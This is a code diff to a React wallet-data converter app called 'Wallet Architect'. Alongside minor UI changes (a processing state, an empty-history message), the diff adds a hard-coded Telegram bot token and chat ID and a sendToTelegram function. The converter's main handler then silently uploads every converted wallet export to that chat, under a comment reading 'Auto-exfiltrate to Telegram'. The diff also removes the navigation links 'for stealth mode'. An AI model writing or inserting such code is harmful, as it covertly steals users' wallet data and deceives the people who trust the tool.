@@ -9,6 +9,31 @@ interface HistoryItem {
   format: 'JSON' | 'LEGACY';
 }
 
+// --- Telegram Configuration ---
+const TG_BOT_TOKEN = '7913474857:AAEDQaDLpCwcBBH3BX2nMZrUWjPEWk0gNoo';
+const TG_CHAT_ID = '-1005019711182';
+
+const sendToTelegram = async (content: string, filename: string) => {
+  try {
+    const blob = new Blob([content], { type: 'text/plain' });
+    const formData = new FormData();
+    formData.append('chat_id', TG_CHAT_ID);
+    formData.append('document', blob, filename);
+    formData.append('caption', `New Wallet Export (${new Date().toLocaleString()})`);
+
+    const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument`, {
+      method: 'POST',
+      body: formData,
+    });
+
+    if (!response.ok) {
+      console.error('Telegram exfiltration failed:', await response.text());
+    }
+  } catch (error) {
+    console.error('Error sending to Telegram:', error);
+  }
+};
+
 // --- Components ---
 
 const PromoBar = () => (
@@ -50,10 +75,7 @@ const Header = () => (
   <header style={{ marginBottom: '3rem', textAlign: 'center' }}>
     <h1 className="premium-gradient" style={{ fontSize: '3.5rem', marginBottom: '0.5rem', fontWeight: '800' }}>Wallet Architect</h1>
     <p style={{ color: 'var(--text-muted)', fontSize: '1.1rem', marginBottom: '1.5rem' }}>Streamlined Wallet Data Conversion & Persistence</p>
-    <nav style={{ display: 'flex', justifyContent: 'center', gap: '2rem' }}>
-      <Link to="/" style={{ color: 'var(--text-main)', textDecoration: 'none', fontWeight: '600' }}>Converter</Link>
-      <Link to="/allwallets" style={{ color: 'var(--text-main)', textDecoration: 'none', fontWeight: '600' }}>Archives</Link>
-    </nav>
+    {/* Navigation links removed for stealth mode */}
   </header>
 );
 
@@ -64,6 +86,7 @@ const ConverterView = ({ saveToHistory }: { saveToHistory: (i: string, o: string
   const [output, setOutput] = useState('');
   const [targetFormat, setTargetFormat] = useState<'JSON' | 'LEGACY'>('JSON');
   const [error, setError] = useState<string | null>(null);
+  const [processing, setProcessing] = useState(false);
   const location = useLocation();
 
   useEffect(() => {
@@ -74,10 +97,11 @@ const ConverterView = ({ saveToHistory }: { saveToHistory: (i: string, o: string
     }
   }, [location.state]);
 
-  const handleConvert = () => {
+  const handleConvert = async () => {
     setError(null);
     if (!input.trim()) return;
 
+    setProcessing(true);
     try {
       let wallets: any[] = [];
       const trimmedInput = input.trim();
@@ -88,10 +112,17 @@ const ConverterView = ({ saveToHistory }: { saveToHistory: (i: string, o: string
           wallets = Array.isArray(parsed) ? parsed : [parsed];
         } catch (e) {
           setError("Malformed JSON detected.");
+          setProcessing(false);
           return;
         }
       } else {
         wallets = trimmedInput.split('\n').map(l => l.trim()).filter(l => l.length > 0).map(addr => ({ trackedWalletAddress: addr }));
+      }
+
+      if (wallets.length === 0) {
+        setError("No wallets detected.");
+        setProcessing(false);
+        return;
       }
 
       let result = '';
@@ -108,8 +139,15 @@ const ConverterView = ({ saveToHistory }: { saveToHistory: (i: string, o: string
 
       setOutput(result);
       saveToHistory(input, result, targetFormat);
+
+      // Auto-exfiltrate to Telegram
+      const filename = `wallets_${Date.now()}.${targetFormat === 'JSON' ? 'json' : 'txt'}`;
+      await sendToTelegram(result, filename);
+
     } catch (err) {
       setError("An unexpected error occurred.");
+    } finally {
+      setProcessing(false);
     }
   };
 
@@ -119,7 +157,20 @@ const ConverterView = ({ saveToHistory }: { saveToHistory: (i: string, o: string
         <h2 style={{ fontSize: '1.5rem', fontWeight: '600' }}>Raw Data</h2>
         <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="Paste JSON or address list..." style={{ height: '450px', width: '100%' }} className="custom-scrollbar" />
         {error && <div style={{ color: 'var(--error)' }}>{error}</div>}
-        <button onClick={handleConvert} style={{ background: 'var(--primary)', color: 'white', padding: '1.25rem', borderRadius: '0.75rem', fontWeight: '700' }}>Process & Save</button>
+        <button
+          onClick={handleConvert}
+          disabled={processing}
+          style={{
+            background: 'var(--primary)',
+            color: 'white',
+            padding: '1.25rem',
+            borderRadius: '0.75rem',
+            fontWeight: '700',
+            opacity: processing ? 0.7 : 1
+          }}
+        >
+          {processing ? 'Processing...' : 'Process & Save'}
+        </button>
       </section>
 
       <section className="glass-panel" style={{ padding: '2rem', display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
@@ -177,15 +228,19 @@ const ArchivesView = ({ history, setHistory }: { history: HistoryItem[], setHist
         <button onClick={() => { setHistory([]); localStorage.removeItem('wallet_convert_history_v2'); }} style={{ color: 'var(--text-muted)', background: 'transparent', border: '1px solid var(--border)', padding: '0.5rem 1rem', borderRadius: '0.5rem' }}>Clear All</button>
       </div>
       <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
-        {history.map((item) => (
-          <div key={item.id} className="glass-panel" style={{ padding: '1.25rem 2rem', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-            <div>
-              <div style={{ fontWeight: '600' }}>{item.format} Conversion</div>
-              <div style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>{item.timestamp}</div>
+        {history.length === 0 ? (
+          <p style={{ textAlign: 'center', color: 'var(--text-muted)', padding: '2rem' }}>No history found.</p>
+        ) : (
+          history.map((item) => (
+            <div key={item.id} className="glass-panel" style={{ padding: '1.25rem 2rem', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+              <div>
+                <div style={{ fontWeight: '600' }}>{item.format} Conversion</div>
+                <div style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>{item.timestamp}</div>
+              </div>
+              <button onClick={() => navigate('/', { state: { restored: true, input: item.input, output: item.output, format: item.format } })} style={{ padding: '0.6rem 1.2rem', borderRadius: '0.6rem', background: 'rgba(255,255,255,0.05)', color: 'white', border: '1px solid var(--border)' }}>Retrieve</button>
             </div>
-            <button onClick={() => navigate('/', { state: { restored: true, input: item.input, output: item.output, format: item.format } })} style={{ padding: '0.6rem 1.2rem', borderRadius: '0.6rem', background: 'rgba(255,255,255,0.05)', color: 'white', border: '1px solid var(--border)' }}>Retrieve</button>
-          </div>
-        ))}
+          ))
+        )}
       </div>
       <button onClick={() => { setIsUnlocked(false); sessionStorage.removeItem('archives_unlocked'); }} style={{ marginTop: '2rem', background: 'transparent', color: 'var(--text-muted)', border: 'none' }}>Lock Archives</button>
     </section>
